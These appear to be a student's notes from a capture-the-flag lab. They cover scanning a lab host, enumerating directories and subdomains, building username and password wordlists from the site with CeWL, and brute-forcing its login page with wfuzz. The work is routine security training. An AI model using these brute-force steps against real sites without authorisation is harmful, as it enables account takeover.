nmap 10.10.232.237 
open port 22 , 80
/etc/hosts ---> antarcticrafts.com

searchsploint apache 2.4.41 resolved into nothing
gobuster resolved into nothing .  ggobuster dns -d AntarctiCrafts.com -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt

dirsearch -> login.php  and more 
//CeWl is the tool that we gonna use to generate a wordlist to brute force the login page .
syntax : 	
	cewl <IP>
	Specify spidering depth: The -d option allows you to set how deep CeWL should spider. For example, to spider two links deep: cewl http://10.10.232.237 -d 2 -w output1.txt
	
	Set minimum and maximum word length: Use the -m and -x options respectively. For instance, to get words between 5 and 10 characters: cewl http://10.10.232.237 -m 5 -x 10 -w output2.txt
	Handle authentication: If the target site is behind a login, you can use the -a flag for form-based authentication.
	Custom extensions: The --with-numbers option will append numbers to words, and using --extension allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
	Follow external links: By default, CeWL doesn't spider external sites, but using the --offsite option allows you to do so.
	
---------------------------------------------------------------------------------
					GENERATING USERNAME/PASSWORD LIST	
└─$ cewl -d 0 -m 5 http://antarcticrafts.com/team.php -w username.txt --lowercase
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                                                    
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/hackthebox/Adventofcyber/day4]
└─$ cewl -d 2 -m 5 http://antarcticrafts.com/ --with-number -w password.txt
---------------------------------------------------------------------------------
					BRUTE FORCE LOGIN PAGE :
──(kali㉿kali)-[~/Desktop/hackthebox/Adventofcyber/day4]
└─$ wfuzz -c -z file,username.txt -z file,password.txt --hs "Please enter the correct credentials" -u http://antarcticrafts.com/login.php -d "username=FUZZ&password=FUZ2Z"


